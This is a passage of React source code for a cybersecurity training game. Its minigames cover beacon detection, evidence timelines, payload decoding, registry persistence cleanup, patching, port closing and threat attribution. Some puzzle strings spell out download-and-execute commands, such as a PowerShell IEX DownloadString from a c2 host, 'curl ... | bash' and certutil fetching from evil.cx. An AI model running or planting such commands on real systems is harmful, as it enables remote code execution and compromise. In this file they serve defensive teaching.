               {row.map((hex, cIdx) => (
                  <span 
                     key={cIdx} 
                     className="text-gray-400 hover:text-white hover:bg-slate-700 cursor-pointer p-1 rounded transition-colors select-none"
                     onClick={() => handleHexClick(rIdx, cIdx)}
                  >
                     {hex}
                  </span>
               ))}
            </div>
         ))}
      </div>
    </div>
  );
};

// 14. Detection Engineer B: Signal to Noise
export const SignalToNoise: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [targetFreq] = useState(Math.floor(Math.random() * 4) + 2); // 2 to 5
  const [userFreq, setUserFreq] = useState(1);
  const [matchTime, setMatchTime] = useState(0);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (userFreq === targetFreq) {
      interval = setInterval(() => {
        setMatchTime(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            onComplete();
            return 100;
          }
          return prev + 5;
        });
      }, 100);
    } else {
      setMatchTime(0);
    }
    return () => clearInterval(interval);
  }, [userFreq, targetFreq, onComplete]);

  // Generate SVG path for a sine wave
  const generateWave = (freq: number, amplitude: number, phase: number, color: string, isTarget: boolean) => {
    let path = `M 0 ${50}`;
    for (let i = 0; i <= 100; i++) {
      const x = i;
      const y = 50 + Math.sin((i / 100) * Math.PI * 2 * freq + phase) * amplitude;
      path += ` L ${x} ${y}`;
    }
    return (
      <path 
        d={path} 
        stroke={color} 
        strokeWidth={isTarget ? "4" : "2"} 
        fill="none" 
        vectorEffect="non-scaling-stroke"
        className={isTarget ? 'opacity-30' : 'drop-shadow-[0_0_5px_rgba(59,130,246,1)]'}
      />
    );
  };

  const [phase, setPhase] = useState(0);
  useEffect(() => {
    const int = setInterval(() => setPhase(p => p + 0.1), 50);
    return () => clearInterval(int);
  }, []);

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">Signal to Noise (RF Analysis)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400">Modulate filter frequency to isolate the data exfiltration carrier signal.</p>
      
      <div className="w-full bg-slate-900 border border-slate-700 rounded-sm p-1 mb-2">
         <div className="h-1 bg-green-500 transition-all duration-100 shadow-[0_0_8px_rgba(34,197,94,0.8)]" style={{ width: `${matchTime}%` }} />
      </div>

      <div className="relative w-full h-48 bg-black border border-slate-700 overflow-hidden flex items-center">
         <svg className="w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="none">
            {generateWave(targetFreq, 30, phase, '#ef4444', true)}
            {generateWave(userFreq, 30, phase, '#3b82f6', false)}
         </svg>
      </div>

      <div className="w-full flex items-center gap-2 mt-4 px-2">
         <span className="text-xs text-gray-500 font-bold">FREQ</span>
         <input 
           type="range" 
           min="1" 
           max="6" 
           step="1"
           value={userFreq}
           onChange={(e) => setUserFreq(Number(e.target.value))}
           className="w-full accent-blue-500 cursor-pointer"
         />
      </div>
    </div>
  );
};

// 15. Detection Engineer C: C2 Heartbeat
export const C2Heartbeat: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [nodes, setNodes] = useState<{id: number, x: number, y: number, isC2: boolean}[]>([]);
  const [activePulse, setActivePulse] = useState<number | null>(null);

  useEffect(() => {
     const pts = Array.from({length: 15}).map((_, i) => ({
        id: i,
        x: Math.random() * 80 + 10,
        y: Math.random() * 80 + 10,
        isC2: i === 0, // Node 0 is C2
     })).sort(() => 0.5 - Math.random());
     setNodes(pts);
  }, []);

  useEffect(() => {
     // Normal jittery traffic
     const noiseInt = setInterval(() => {
        const randomNode = Math.floor(Math.random() * 15);
        setActivePulse(nodes[randomNode]?.id);
        setTimeout(() => setActivePulse(null), 200);
     }, 400);

     // Perfectly timed C2 heartbeat every 1.5s
     const c2Node = nodes.find(n => n.isC2);
     const c2Int = setInterval(() => {
        if (c2Node) {
           setActivePulse(c2Node.id);
           setTimeout(() => setActivePulse(null), 300);
        }
     }, 1500);

     return () => { clearInterval(noiseInt); clearInterval(c2Int); };
  }, [nodes]);

  const handleSelect = (isC2: boolean) => {
     if (isC2) {
        onComplete();
     } else {
        onError("Invalid endpoint isolated. True C2 still active.");
     }
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">C2 Heartbeat (Beacon Detection)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 px-2 mt-2 w-full">Observe external traffic scatter plot. Isolate the endpoint exhibiting perfectly periodic C2 beacons.</p>
      
      <div className="relative w-full h-64 bg-slate-900 border border-slate-700 overflow-hidden" style={{ backgroundImage: 'radial-gradient(#334155 1px, transparent 1px)', backgroundSize: '16px 16px' }}>
         {nodes.map(n => (
            <div 
               key={n.id}
               className="absolute w-6 h-6 -translate-x-1/2 -translate-y-1/2 flex items-center justify-center cursor-crosshair group z-[20]"
               style={{ left: `${n.x}%`, top: `${n.y}%` }}
               onClick={() => handleSelect(n.isC2)}
            >
               <div className={`w-2 h-2 rounded-full transition-all duration-75 ${
                  activePulse === n.id 
                  ? 'bg-red-500 scale-[3] shadow-[0_0_15px_rgba(239,68,68,1)]' 
                  : 'bg-blue-400 group-hover:bg-yellow-400 group-hover:scale-150'
               }`} />
            </div>
         ))}
      </div>
    </div>
  );
};

// 16. DFIR Specialist A: Evidence Chain
export const EvidenceChain: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const events = [
    { id: 1, text: "[Event 4688] powershell.exe -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.local/pay')\"", order: 2 },
    { id: 2, text: "[Event 3] Network connection to 198.51.100.33:443", order: 1 },
    { id: 3, text: "[Event 4698] Scheduled Task 'WinUpdate' created via schtasks.exe", order: 3 }
  ];
  
  // Scramble initially
  const [cards, setCards] = useState(() => [...events].sort(() => Math.random() - 0.5));
  const [selectedIdx, setSelectedIdx] = useState<number | null>(null);

  const swapCards = (idx1: number, idx2: number) => {
    const newCards = [...cards];
    const temp = newCards[idx1];
    newCards[idx1] = newCards[idx2];
    newCards[idx2] = temp;
    setCards(newCards);
    setSelectedIdx(null);

    // Check win condition
    if (newCards[0].order === 1 && newCards[1].order === 2 && newCards[2].order === 3) {
      setTimeout(() => onComplete(), 500);
    }
  };

  const handleCardClick = (idx: number) => {
    if (selectedIdx === null) {
      setSelectedIdx(idx);
    } else {
      if (selectedIdx !== idx) {
        swapCards(selectedIdx, idx);
      } else {
         setSelectedIdx(null);
      }
    }
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-left">
      <h3 className="text-xl font-bold text-blue-500 text-center">Evidence Chain (Kill Chain)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 text-center px-2">Swap the logs to reconstruct the chronological attack timeline: Initial Access &rarr; Execution &rarr; Persistence.</p>
      
      <div className="flex flex-col gap-3 mt-4 w-full px-4">
         {cards.map((card, idx) => (
            <div 
              key={card.id}
              className={`p-3 border rounded cursor-pointer text-[10px] sm:text-xs transition-all ${
                 selectedIdx === idx 
                 ? 'bg-blue-900 border-blue-400 scale-[1.02] shadow-[0_0_10px_rgba(96,165,250,0.5)] text-white' 
                 : 'bg-black border-slate-700 text-gray-400 hover:border-slate-500'
              }`}
              onClick={() => handleCardClick(idx)}
            >
               {card.text}
            </div>
         ))}
      </div>
    </div>
  );
};

// 17. DFIR Specialist B: Hex Hunt
export const HexHunt: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [options, setOptions] = useState<{text: string, correct: boolean}[]>([]);
  const targetEncoded = "cG93ZXJzaGVsbC5leGUgLWVuYyBaWE1nWTNKbA==";

  useEffect(() => {
     const fakes = [
        "powershell.exe -ExecutionPolicy Bypass",
        "cmd.exe /c whoami /all",
        "curl http://10.0.0.5/payload.sh | bash",
        "certutil.exe -urlcache -split -f http://evil.cx"
     ].sort(() => 0.5 - Math.random()).slice(0, 3);
     
     const opts = [
        { text: "powershell.exe -enc ZXMp...", correct: true },
        { text: fakes[0], correct: false },
        { text: fakes[1], correct: false },
        { text: fakes[2], correct: false }
     ].sort(() => 0.5 - Math.random());
     
     setOptions(opts);
  }, []);

  const handleSelect = (correct: boolean) => {
     if (correct) onComplete();
     else onError("Incorrect decoding. Base64 translation mismatch.");
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">PCAP Analysis (Payload Decoder)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 px-2">Analyze the Base64 encoded payload found in the PCAP stream and identify the decoded command.</p>
      
      <div className="bg-slate-900 border border-slate-700 p-4 w-full break-all text-yellow-500 text-[10px] sm:text-sm shadow-inner rounded-md my-2">
         {targetEncoded}
      </div>

      <div className="grid grid-cols-1 gap-2 w-full px-4">
         {options.map((opt, i) => (
            <button 
               key={i}
               onClick={() => handleSelect(opt.correct)}
               className="bg-black border border-slate-700 p-2 text-left text-[10px] sm:text-xs text-green-400 hover:bg-slate-800 hover:border-green-500 transition-colors truncate"
            >
               {opt.text}
            </button>
         ))}
      </div>
    </div>
  );
};

// 18. DFIR Specialist C: Persistence Wipe
export const PersistenceWipe: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [path, setPath] = useState<string[]>(["HKLM"]);
  const targetPath = ["HKLM", "SOFTWARE", "Microsoft", "Windows", "CurrentVersion", "Run"];
  
  const directories: Record<string, string[]> = {
     "HKLM": ["HARDWARE", "SAM", "SOFTWARE", "SYSTEM"],
     "HARDWARE": ["DESCRIPTION", "DEVICEMAP"],
     "SAM": ["SAM"],
     "SOFTWARE": ["Classes", "Microsoft", "Policies"],
     "SYSTEM": ["ControlSet001", "Setup"],
     "Microsoft": ["Cryptography", "Windows", "Windows NT"],
     "Windows": ["CurrentVersion"],
     "CurrentVersion": ["Explorer", "Run", "RunOnce"],
     "Run": [],
     "RunOnce": [],
     "Explorer": [],
     // Dead ends
     "Classes": [], "Policies": [], "Cryptography": [], "Windows NT": [],
     "DESCRIPTION": [], "DEVICEMAP": [], "ControlSet001": [], "Setup": []
  };

  const currentDir = path[path.length - 1];
  const isTargetDir = currentDir === "Run" && path.join('\\') === targetPath.join('\\');

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono">
      <h3 className="text-xl font-bold text-blue-500 text-center">Registry Editor (Persistence Wipe)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 text-center px-2">Navigate to the standard Windows Run key and delete the malicious autorun entry.</p>
      
      <div className="w-full bg-slate-900 border border-slate-700 p-2 h-64 flex flex-col text-[10px] sm:text-xs text-left">
         <div className="flex items-center gap-2 mb-2 bg-black p-2 border border-slate-800">
            <button 
               className="bg-slate-700 hover:bg-slate-600 text-white px-2 py-1 rounded text-[10px] disabled:opacity-50 border border-slate-500"
               disabled={path.length <= 1}
               onClick={() => setPath(p => p.slice(0, -1))}
            >
               &uarr; Up
            </button>
            <span className="text-blue-300 break-all truncate">{path.join('\\')}</span>
         </div>

         <div className="flex-1 overflow-y-auto flex flex-col gap-1 bg-black p-2 border border-slate-800">
            {directories[currentDir]?.map(dir => (
               <div 
                 key={dir} 
                 className="flex items-center gap-2 p-1 hover:bg-slate-800 cursor-pointer border border-transparent hover:border-slate-700"
                 onClick={() => setPath(p => [...p, dir])}
               >
                  <span className="text-yellow-600">📁</span>
                  <span className="text-gray-300">{dir}</span>
               </div>
            ))}

            {isTargetDir && (
               <div className="flex items-center justify-between p-1 hover:bg-slate-800 group border border-transparent">
                  <div className="flex items-center gap-2">
                     <span className="text-gray-400">📄</span>
                     <span className="text-red-400 font-bold truncate">"WinUpdater" = "C:\Temp\payload.exe"</span>
                  </div>
                  <button 
                     className="hidden group-hover:block bg-red-900 border border-red-500 hover:bg-red-700 text-red-100 px-2 py-1 ml-2"
                     onClick={(e) => { e.stopPropagation(); onComplete(); }}
                  >
                     DEL
                  </button>
               </div>
            )}
            
            {directories[currentDir]?.length === 0 && !isTargetDir && (
               <div className="text-center text-gray-600 italic mt-4">Key has no subkeys</div>
            )}
         </div>
      </div>
    </div>
  );
};

// 19. SecOps Architect A: Critical Patching
export const CriticalPatching: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [servers, setServers] = useState<{id: number, name: string, ip: string, service: string, version: string}[]>([]);
  const [currentCve, setCurrentCve] = useState<{cve: string, desc: string, vulnService: string, vulnVersion: string} | null>(null);
  const [score, setScore] = useState(0);

  const softwareDatabase = [
     { svc: "Apache", ver: "2.4.49", cve: "CVE-2021-41773", desc: "Path Traversal & RCE" },
     { svc: "OpenSSH", ver: "7.2p2", cve: "CVE-2016-3115", desc: "X11 Forwarding Bypass" },
     { svc: "Nginx", ver: "1.18.0", cve: "CVE-2021-23017", desc: "DNS Resolver Off-by-one" },
     { svc: "Redis", ver: "5.0.5", cve: "CVE-2020-14147", desc: "Integer Overflow" },
     { svc: "MySQL", ver: "5.7.12", cve: "CVE-2016-6662", desc: "Remote Root Code Exec" },
     { svc: "vsftpd", ver: "2.3.4", cve: "CVE-2011-2523", desc: "Smiling Face Backdoor" }
  ];

  // eslint-disable-next-line react-hooks/exhaustive-deps
  const generateScenario = () => {
     // Pick 3 random software configs
     const shuffled = [...softwareDatabase].sort(() => 0.5 - Math.random());
     const selected = shuffled.slice(0, 3);
     
     const srvs = selected.map((s, i) => ({
        id: i,
        name: `SRV-${String.fromCharCode(65+i)}`,
        ip: `10.0.0.${10+i}`,
        service: s.svc,
        version: s.ver
     }));
     setServers(srvs);
     
     // Pick one as the active CVE
     const vulnTarget = selected[Math.floor(Math.random() * selected.length)];
     setCurrentCve({
        cve: vulnTarget.cve,
        desc: vulnTarget.desc,
        vulnService: vulnTarget.svc,
        vulnVersion: vulnTarget.ver
     });
  };

  useEffect(() => {
     generateScenario();
  }, [score, generateScenario]);

  const handlePatch = (srv: any) => {
     if (srv.service === currentCve?.vulnService && srv.version === currentCve?.vulnVersion) {
        if (score + 1 >= 5) {
           onComplete();
        } else {
           setScore(s => s + 1);
        }
     } else {
        onError("CRITICAL: Patched wrong system. Downtime induced. Re-evaluating.");
        setScore(Math.max(0, score - 1));
     }
  };

  return (
    <div className="flex flex-col gap-2 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">Critical Patching (Vulnerability Mgmt)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400">Match the incoming CVE to the vulnerable server and deploy the patch. ({score}/5)</p>
      
      {currentCve && (
         <div className="bg-red-950 border-2 border-red-600 p-2 w-full mt-2 shadow-[0_0_10px_rgba(220,38,38,0.5)]">
            <div className="text-red-400 font-bold text-lg mb-1">{currentCve.cve}</div>
            <div className="text-xs text-red-200">{currentCve.desc}</div>
            <div className="text-[10px] text-gray-500 mt-1">Cross-reference CVE details to identify vulnerable service + version</div>
         </div>
      )}
      
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 mt-4 w-full">
         {servers.map((srv) => (
            <div key={srv.id} className="bg-slate-900 border border-slate-700 p-2 flex flex-col hover:border-blue-500 hover:bg-slate-800 transition-colors cursor-pointer group" onClick={() => handlePatch(srv)}>
               <div className="text-white font-bold text-sm border-b border-slate-700 mb-1 pb-1">{srv.name}</div>
               <div className="text-[10px] text-gray-500 mb-2">{srv.ip}</div>
               <div className="text-xs text-blue-400">{srv.service}</div>
               <div className="text-xs text-blue-200">{srv.version}</div>
               
               <div className="mt-2 text-center text-[10px] font-bold text-green-500 opacity-0 group-hover:opacity-100 transition-opacity">
                  DEPLOY PATCH &rarr;
               </div>
            </div>
         ))}
      </div>
    </div>
  );
};

// 20. SecOps Architect B: Entropy Boost
export const EntropyBoost: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [policies, setPolicies] = useState([
     { id: 1, name: "Allow Dictionary Words", state: true, target: false },
     { id: 2, name: "Require Special Characters", state: false, target: true },
     { id: 3, name: "Password Expiry: Never", state: true, target: false },
     { id: 4, name: "Minimum Length >= 14", state: false, target: true }
  ]);

  const togglePolicy = (id: number) => {
     setPolicies(prev => {
        const next = prev.map(p => p.id === id ? {...p, state: !p.state} : p);
        if (next.every(p => p.state === p.target)) {
           setTimeout(() => onComplete(), 300);
        }
        return next;
     });
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono">
      <h3 className="text-xl font-bold text-blue-500 text-center">Entropy Boost (Credential Hardening)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 text-center px-4">Toggle the AD Domain policies to secure standards.</p>
      
      <div className="flex flex-col w-full max-w-sm gap-2 mt-2 bg-slate-900 border border-slate-700 p-4">
         {policies.map(p => (
            <div key={p.id} className="flex justify-between items-center border-b border-slate-800 pb-2">
               <span className="text-[10px] sm:text-xs text-gray-300 pr-2">{p.name}</span>
               <button 
                  onClick={() => togglePolicy(p.id)}
                  className={`px-3 py-1 rounded text-[10px] font-bold transition-colors border select-none ${p.state ? 'bg-green-900 text-green-400 border-green-500' : 'bg-red-900 text-red-400 border-red-500'}`}
               >
                  {p.state ? 'ENABLED' : 'DISABLED'}
               </button>
            </div>
         ))}
      </div>
    </div>
  );
};

// 21. SecOps Architect C: Port Closer
export const PortCloser: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const allPorts = [
     { port: 22, svc: "ssh" },
     { port: 23, svc: "telnet" },
     { port: 21, svc: "ftp" },
     { port: 3389, svc: "ms-wbt-server" },
     { port: 445, svc: "microsoft-ds" },
     { port: 139, svc: "netbios-ssn" }
  ];

  const [ports, setPorts] = useState<{port: number, svc: string, open: boolean}[]>([]);
  const [attackProgress, setAttackProgress] = useState(0); 
  
  // Initialize some doors open
  useEffect(() => {
     const assigned = allPorts.map(p => ({
        ...p,
        open: Math.random() > 0.5 // Roughly 50% open
     }));
     // Ensure at least 1 open
     if (!assigned.some(p => p.open)) assigned[0].open = true;
     
     setPorts(assigned);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Attack timer
  useEffect(() => {
    const isAnyOpen = ports.some(p => p.open);
    let interval: NodeJS.Timeout;
    
    if (isAnyOpen) {
       interval = setInterval(() => {
          setAttackProgress(prev => {
             if (prev >= 100) {
                 onError("CRITICAL: Exposed port leveraged for RCE. Try again.");
                // Reset
                const resetPorts = [...ports].map(p => ({...p, open: Math.random() > 0.5}));
                if (!resetPorts.some(p => p.open)) resetPorts[Math.floor(Math.random()*6)].open = true;
                setPorts(resetPorts);
                return 0;
             }
             return prev + 1.5;
          });
       }, 100);
    } else {
       // All closed!
       if (attackProgress < 100 && attackProgress > 0) {
          onComplete(); 
       }
    }

    return () => clearInterval(interval);
  }, [ports, attackProgress, onComplete, onError]);

  const closePort = (portNum: number) => {
     setPorts(prev => prev.map(p => p.port === portNum ? {...p, open: false} : p));
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500 text-center w-full">Port Closer (Attack Surface)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 w-full px-2">Review the NMAP footprint. Close all high-risk exposed ports before the automated exploit fires.</p>
      
      {/* Breach Warning Bar */}
      <div className="w-full bg-red-900/30 border border-red-900 h-2 mt-2">
         <div className="h-full bg-red-500 shadow-[0_0_10px_rgba(239,68,68,1)] transition-all duration-100 ease-linear" style={{ width: `${attackProgress}%` }} />
      </div>

      <div className="bg-black p-4 border border-slate-700 w-full max-w-sm relative text-left text-xs text-gray-300">
         <h4 className="text-green-400 mb-2">nmap -p- -sV 10.0.0.15</h4>
         <div className="grid grid-cols-12 text-gray-500 mb-1 border-b border-slate-800 pb-1 font-bold">
            <span className="col-span-3">PORT</span>
            <span className="col-span-3">STATE</span>
            <span className="col-span-4">SERVICE</span>
            <span className="col-span-2 text-right">ACTION</span>
         </div>

         {ports.map((p) => (
            <div key={p.port} className="grid grid-cols-12 items-center py-2 border-b border-slate-800 hover:bg-slate-900 group transition-colors">
               <span className="col-span-3 text-blue-400">{p.port}/tcp</span>
               <span className={`col-span-3 font-bold ${p.open ? 'text-red-500 animate-pulse drop-shadow-[0_0_5px_rgba(239,68,68,0.8)]' : 'text-slate-600'}`}>
                  {p.open ? 'open' : 'closed'}
               </span>
               <span className="col-span-4 text-gray-400 truncate pr-2">{p.svc}</span>
               <span className="col-span-2 text-right">
                  {p.open && (
                     <button 
                        className="bg-red-900 text-red-200 px-2 py-1 rounded text-[10px] hover:bg-red-700 border border-red-500 shadow-md"
                        onClick={() => closePort(p.port)}
                     >
                        CLOSE
                     </button>
                  )}
               </span>
            </div>
         ))}
      </div>
    </div>
  );
};

// 22. CTI Analyst A: Feed Scrubbing
export const FeedScrubbing: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [headlines, setHeadlines] = useState<{ id: number; text: string; isThreat: boolean; active: boolean }[]>([]);
  const [score, setScore] = useState(0);
  const targetScore = 5;

  const possibleHeadlines = [
    { text: "Routine backup to AWS S3 completed successfully", isThreat: false },
    { text: "Dark web chatter: 'Access brokers selling VPN creds for ACME Corp'", isThreat: true },
    { text: "Server resource utilization normal for Q3", isThreat: false },
    { text: "New PoC exploit released for zero-day in edge routers", isThreat: true },
    { text: "Spearphishing campaign targeting HR departments detected", isThreat: true },
    { text: "Network maintenance window scheduled for Friday 2AM", isThreat: false },
    { text: "C2 infrastructure linked to APT28 spun up on new ASN", isThreat: true },
    { text: "Employee onboarding portal UI updated", isThreat: false },
    { text: "Pastebin dump contains 1M hashed passwords of unknown origin", isThreat: true },
    { text: "Annual cybersecurity awareness training completed", isThreat: false }
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      if (headlines.length < 8) {
         setHeadlines(prev => {
            const randomHeadline = possibleHeadlines[Math.floor(Math.random() * possibleHeadlines.length)];
            return [...prev, { ...randomHeadline, id: Math.random(), active: true }];
         });
      }
    }, 1500);

    return () => clearInterval(interval);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [headlines.length]);

  // Remove headlines over time
  useEffect(() => {
     const cleanup = setInterval(() => {
        setHeadlines(prev => {
           if (prev.length > 5) {
              return prev.slice(1); // remove oldest
           }
           return prev;
        });
     }, 3500);
     return () => clearInterval(cleanup);
  }, []);

  const handleClick = (id: number, isThreat: boolean) => {
    if (isThreat) {
      const newScore = score + 1;
      setScore(newScore);
      setHeadlines(prev => prev.filter(h => h.id !== id));
      
      if (newScore >= targetScore) {
        onComplete();
      }
    } else {
      // Penalty for clicking non-threats!
      setScore(Math.max(0, score - 1));
      setHeadlines(prev => prev.filter(h => h.id !== id));
      onError("False Positive Logged! Intelligence accuracy dropping.");
    }
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">Feed Scrubbing (OSINT Analysis)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400">Tag actionable threat intelligence from the noisy global OSINT feed stream.</p>
      
      <div className="flex gap-4 border border-blue-500 bg-slate-900 px-4 py-2 mt-2 w-full max-w-sm justify-between shadow-[0_0_10px_rgba(59,130,246,0.5)]">
         <span className="text-blue-300">Actionable Intel Logged:</span>
         <span className="text-green-400 font-bold">{score} / {targetScore}</span>
      </div>

      <div className="w-full bg-black border-2 border-slate-700 h-64 overflow-hidden relative p-4 flex flex-col gap-2">
         {headlines.map((hl) => (
            <div 
               key={hl.id}
               className={`p-2 border border-slate-700 rounded cursor-pointer transition-all hover:scale-[1.02] active:scale-95 text-left bg-slate-800 hover:bg-slate-700`}
               onClick={() => handleClick(hl.id, hl.isThreat)}
            >
               <span className={`text-[10px] sm:text-xs font-bold ${hl.isThreat ? 'text-gray-300' : 'text-gray-400'}`}>{hl.text}</span>
            </div>
         ))}
      </div>
    </div>
  );
};

// 23. CTI Analyst B: APT Attribution
export const APTAttribution: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [scenario] = useState(() => {
     const scenarios = [
        {
           incident: "TTPs: Spearphishing via Word macros, custom dropping of Cobalt Strike, C2 traffic over HTTPS mimicking Google Analytics. Target: Financial sector.",
           options: [
              { name: "FIN7 (Carbanak)", correct: true },
              { name: "APT29 (Cozy Bear)", correct: false },
              { name: "Lazarus Group", correct: false }
           ]
        },
        {
           incident: "TTPs: Supply chain compromise of build servers, stealthy lateral movement using golden tickets, data exfiltration via custom protocols. Target: Govt/IT.",
           options: [
              { name: "FIN7 (Carbanak)", correct: false },
              { name: "APT29 (Cozy Bear)", correct: true },
              { name: "Lazarus Group", correct: false }
           ]
        },
        {
           incident: "TTPs: Destructive wiper malware disguised as ransomware, spearphishing with crypto-lure themes, SWIFT network manipulation. Target: Cryptocurrency exchanges.",
           options: [
              { name: "FIN7 (Carbanak)", correct: false },
              { name: "APT29 (Cozy Bear)", correct: false },
              { name: "Lazarus Group", correct: true }
           ]
        }
     ];
     const sc = scenarios[Math.floor(Math.random() * scenarios.length)];
     sc.options = sc.options.sort(() => 0.5 - Math.random());
     return sc;
  });

  const handleSelect = (correct: boolean) => {
     if (correct) {
        onComplete();
     } else {
        onError("Incorrect attribution. Threat actors misidentified. Review TTPs.");
     }
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">APT Attribution (Profiling)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 px-2 mt-2">Match the incident's Tactics, Techniques, and Procedures (TTPs) to the known Advanced Persistent Threat group.</p>
      
      <div className="bg-slate-900 border border-red-900 p-4 mt-2 w-full text-left text-[10px] sm:text-xs text-gray-300 shadow-[inset_0_0_15px_rgba(127,29,29,0.5)]">
         <span className="text-red-500 font-bold block mb-2 text-sm">INCIDENT REPORT SUMMARY:</span>
         {scenario.incident}
      </div>
      
      <div className="w-full text-red-400 font-bold mt-2">ATTRIBUTION:</div>

      <div className="flex flex-col sm:flex-row gap-2 w-full justify-center px-2">
         {scenario.options.map((opt, i) => (
            <button 
               key={i}
               className="bg-black border border-slate-600 p-3 flex-1 text-blue-400 hover:bg-slate-800 hover:border-blue-500 transition-colors focus:ring-2 focus:ring-blue-500 text-[10px] sm:text-xs font-bold"
               onClick={() => handleSelect(opt.correct)}
            >
               {opt.name}
            </button>
         ))}
      </div>
    </div>
  );
};

// 24. CTI Analyst C: Threat Map
export const ThreatMap: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [heat, setHeat] = useState(50); // 0 to 100
  const [isCooling, setIsCooling] = useState(false);

  // Heating up naturally
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (!isCooling) {
       interval = setInterval(() => {
          setHeat(prev => {
             if (prev >= 100) {
                 onError("Data exfiltration complete! Node compromised. Restarting containment protocol...");
                return 40;
             }
             return prev + 3;
          });
       }, 200);
    }
    return () => clearInterval(interval);
  }, [isCooling]);

  // Cooling down manually
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isCooling) {
       interval = setInterval(() => {
          setHeat(prev => {
             if (prev <= 0) {
                clearInterval(interval);
                setTimeout(() => onComplete(), 300);
                return 0;
             }
             return prev - 5;
          });
       }, 100);
    }
    return () => clearInterval(interval);
  }, [isCooling, onComplete]);

  return (
    <div className="flex flex-col gap-4 items-center w-full select-none font-mono text-center">
      <h3 className="text-xl font-bold text-blue-500">Threat Map (Global Monitor)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 px-2">Anomalous outbound transfer detected. Tap and hold the flashing rogue autonomous system node to Null-Route the traffic.</p>
      
      <div className="w-full bg-slate-900 border border-slate-700 p-1 mt-2 relative">
         <div className="w-full h-4 bg-black border border-slate-800 relative overflow-hidden">
            <div 
              className="h-full bg-red-600 transition-all duration-200" 
              style={{ width: `${heat}%`, opacity: 0.5 + (heat / 200) }} 
            />
         </div>
         <div className="text-[10px] text-red-500 mt-1">EXFILTRATION PROGRESS: {Math.floor(heat)}%</div>
      </div>

      {/* Topology Map */}
      <div className="relative mt-4 w-full h-64 border border-blue-900 bg-black flex items-center justify-center overflow-hidden shadow-[inset_0_0_50px_rgba(30,58,138,0.3)]" style={{ backgroundImage: 'radial-gradient(#1e3a8a 1px, transparent 1px)', backgroundSize: '16px 16px' }}>
         
         {/* Normal nodes */}
         <div className="absolute w-2 h-2 bg-blue-500 rounded-full left-[20%] top-[30%]" />
         <div className="absolute w-2 h-2 bg-blue-500 rounded-full left-[80%] top-[40%]" />
         <div className="absolute w-2 h-2 bg-blue-500 rounded-full left-[40%] top-[80%]" />
         <div className="absolute w-2 h-2 bg-blue-500 rounded-full left-[60%] top-[20%]" />

         {/* The Rogue Node */}
         <div 
            className="absolute z-10 w-24 h-24 rounded-full cursor-pointer transition-all duration-200 flex items-center justify-center group"
            style={{ 
               backgroundColor: `rgba(239, 68, 68, ${heat / 300})`, // Red aura
               right: '15%',
               top: '55%'
            }}
            onMouseDown={() => setIsCooling(true)}
            onMouseUp={() => setIsCooling(false)}
            onMouseLeave={() => setIsCooling(false)}
            onTouchStart={() => setIsCooling(true)}
            onTouchEnd={() => setIsCooling(false)}
         >
            <div className={`w-4 h-4 rounded-full bg-red-500 shadow-[0_0_15px_rgba(239,68,68,1)] transition-transform ${isCooling ? 'scale-75' : 'scale-[1.5] animate-pulse'}`}></div>
            
            {/* Emitting packets visual (pseudo) */}
            <div className={`absolute w-full h-full border-2 border-red-500 rounded-full animate-ping opacity-30 ${isCooling ? 'hidden' : 'block'}`} style={{ animationDuration: '1s' }} />
            
            <span className="absolute -top-6 text-[10px] text-red-400 opacity-0 group-hover:opacity-100 bg-black/80 px-1 border border-red-900 shadow-md">NULL ROUTE</span>
         </div>
         
         {/* Connecting lines fake SVG */}
         <svg className="absolute inset-0 w-full h-full pointer-events-none opacity-30">
